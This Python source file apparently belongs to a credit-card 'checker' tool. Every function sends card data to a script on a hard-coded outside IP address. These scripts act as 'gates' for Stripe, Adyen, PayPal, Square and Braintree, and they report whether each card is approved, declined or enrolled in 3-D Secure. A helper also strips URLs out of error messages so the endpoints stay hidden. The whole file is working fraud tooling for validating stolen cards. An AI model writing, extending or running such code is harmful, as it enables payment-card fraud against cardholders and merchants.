import re
import requests

def _safe_error(e):
    msg = str(e)
    if "timeout"  in msg.lower() or "timed out" in msg.lower(): return "Timeout"
    if "connect"  in msg.lower(): return "Connection error"
    if "ssl"      in msg.lower(): return "SSL error"
    if "proxy"    in msg.lower(): return "Proxy error"
    msg = re.sub(r'https?://[^\s\'">\)]+', '[hidden]', msg)
    return msg[:60]

def _call_gate_api(url, card_data, param="card"):
    try:
        r = requests.get(url, params={param: card_data}, timeout=60)
        try:    data = r.json()
        except Exception: data = None
        if not isinstance(data, dict):
            return {"status": "ERROR", "message": f"API Error (HTTP {r.status_code})", "response": ""}
        status   = (data.get("status") or "ERROR").upper()
        message  = data.get("message") or data.get("response") or status
        response = data.get("response") or ""
        return {"status": status, "message": message, "response": response, "time": data.get("time", "")}
    except Exception as e:
        return {"status": "ERROR", "message": f"Service unavailable: {_safe_error(e)}", "response": ""}

def stripe_auth(card_data, site="https://hi5up.com"):
    try:
        r = requests.get(
            "http://104.214.171.212/autostripe.php",
            params={"site": site, "card": card_data},
            timeout=60,
        )
        try:    data = r.json()
        except Exception: data = None
        if not isinstance(data, dict):
            return {"status": "ERROR", "message": f"API Error (HTTP {r.status_code})", "response": ""}
        status   = (data.get("status") or "ERROR").upper()
        response = data.get("response") or data.get("message") or status
        return {"status": status, "message": response, "response": response}
    except Exception as e:
        return {"status": "ERROR", "message": f"Service unavailable: {_safe_error(e)}", "response": ""}

def adyen_auth(card_data):
    return _call_gate_api("http://104.214.171.212/ayden_api.php", card_data, param="card")

def paypal_charge(card_data):
    return _call_gate_api("http://104.214.171.212/pp.php", card_data, param="card")

def paypal_charge2(card_data):
    return _call_gate_api("http://104.214.171.212/pp_charge.php", card_data, param="card")

def square_charge(card_data):
    return _call_gate_api("http://104.214.171.212/sq.php", card_data, param="card")

def stripe_auth2(card_data):
    return _call_gate_api("http://104.214.171.212/stauth2.php", card_data, param="card")

def braintree_auth(card_data):
    return _call_gate_api("http://104.214.171.212/b3.php", card_data, param="card")

def vbv_lookup(card_data):
    try:
        r = requests.get(
            "http://104.214.171.212/vbv.php",
            params={"card": card_data},
            timeout=60,
        )
        try:    data = r.json()
        except Exception: data = None
        if not isinstance(data, dict):
            return {"status": "ERROR", "message": f"API Error (HTTP {r.status_code})"}
        is_3ds  = data.get("3ds")
        message = data.get("message") or data.get("status") or ""
        if is_3ds is None:
            return {"status": "NOT_FOUND", "message": message, "3ds": None}
        status  = "DECLINED" if is_3ds else "APPROVED"
        return {"status": status, "message": message, "3ds": is_3ds}
    except Exception as e:
        return {"status": "ERROR", "message": f"Service unavailable: {_safe_error(e)}"}

def stripe_1(card_data):
    return _call_gate_api("http://104.214.171.212/st11.php", card_data, param="card")

def stripe_1d(card_data):
    return _call_gate_api("http://104.214.171.212/st1.php", card_data, param="card")

def stripe_5(card_data):
    return _call_gate_api("http://104.214.171.212/st5$.php", card_data, param="card")

def stripeccn(card_data):
    return _call_gate_api("http://104.214.171.212/stripeccn.php", card_data, param="card")

def freechk_stripe(card_data):
    return _call_gate_api("http://104.214.171.212/stripe.php", card_data, param="card")

def vbs_lookup(card_data):
    try:
        r = requests.get(
            "http://104.214.171.212/vbv_old.php",
            params={"card": card_data},
            timeout=60,
        )
        try:    data = r.json()
        except Exception: data = None
        if not isinstance(data, dict):
            return {"status": "ERROR", "result": "ERROR", "message": f"API Error (HTTP {r.status_code})"}
        if not data.get("success"):
            return {"status": "ERROR", "result": "ERROR", "message": data.get("error") or "Unknown error"}
        return {
            "status":                  data.get("status") or "",
            "result":                  data.get("result") or "UNKNOWN",
            "enrolled":                data.get("enrolled"),
            "liability_shifted":       data.get("liability_shifted"),
            "liability_shift_possible":data.get("liability_shift_possible"),
        }
    except Exception as e:
        return {"status": "ERROR", "result": "ERROR", "message": _safe_error(e)}

                    
